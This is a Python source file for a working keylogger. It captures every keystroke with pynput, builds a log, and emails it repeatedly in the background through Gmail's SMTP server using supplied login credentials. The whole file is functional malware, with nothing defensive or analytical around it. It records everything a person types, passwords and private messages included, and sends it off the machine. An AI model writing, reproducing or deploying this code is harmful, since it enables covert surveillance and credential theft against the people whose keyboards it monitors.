#!/usr/bin/env python

import pynput.keyboard
import threading, smtplib

class Keylogger:
    '''Class created to keylog files.'''

    def __init__(self, time_interval, email, password):
        '''Runs automatically, good place for variables.'''
        self.log = "Keylogger has started!"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        '''Takes care of appending key strokes.'''
        self.log += string

    def process_key_press(self, key):
        '''Call back method executed every time user enters key.'''
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' '+ str(key) + ' '
        self.append_to_log(current_key)

    def report(self):
        '''A recursive method that uses threading to run in the background
        - so as not interrupting the execution of main program.'''
        # print(self.log)
        self.send_email(self.email, self.password, "\n\n" + self.log) #the slashes help to place text only in content of message, not header.
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message):
        '''Use Google's SMTP server to email the report.'''
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        '''Start method for keylogger; it starts report method as well.'''
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()